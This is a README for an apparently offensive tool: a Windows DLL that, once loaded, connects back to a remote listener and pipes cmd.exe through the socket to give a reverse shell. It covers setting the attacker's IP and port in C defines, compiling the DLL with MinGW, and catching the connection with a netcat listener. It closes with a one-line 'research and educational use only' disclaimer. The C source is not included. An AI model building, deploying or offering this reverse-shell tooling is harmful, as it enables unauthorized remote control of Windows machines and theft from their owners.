# Windows DLL Reverse Shell

A simple Windows DLL that establishes a reverse TCP shell connection to a specified host and port.

## Overview

This DLL connects back to a remote listener and redirects the `cmd.exe` process input/output through the socket, allowing remote command execution.

## Configuration

Edit the following values in the source:

```c
#define REVERSEIP "127.0.0.1"
#define REVERSEPORT 5151
```

Replace them with the attacker's IP and listening port.

## Compilation

Compile with MinGW:

```bash
x86_64-w64-mingw32-gcc -shared -o ReverseShell.dll ReverseShell.c -lws2_32 -Wl,--subsystem,windows
```

## Usage

Run a listener on the specified port:

```bash
nc -lvnp 5151
```

When loaded, the DLL will connect back to the defined host and spawn a remote shell.

## Notes

For research and educational use only. Do not deploy on systems without explicit authorization.

---
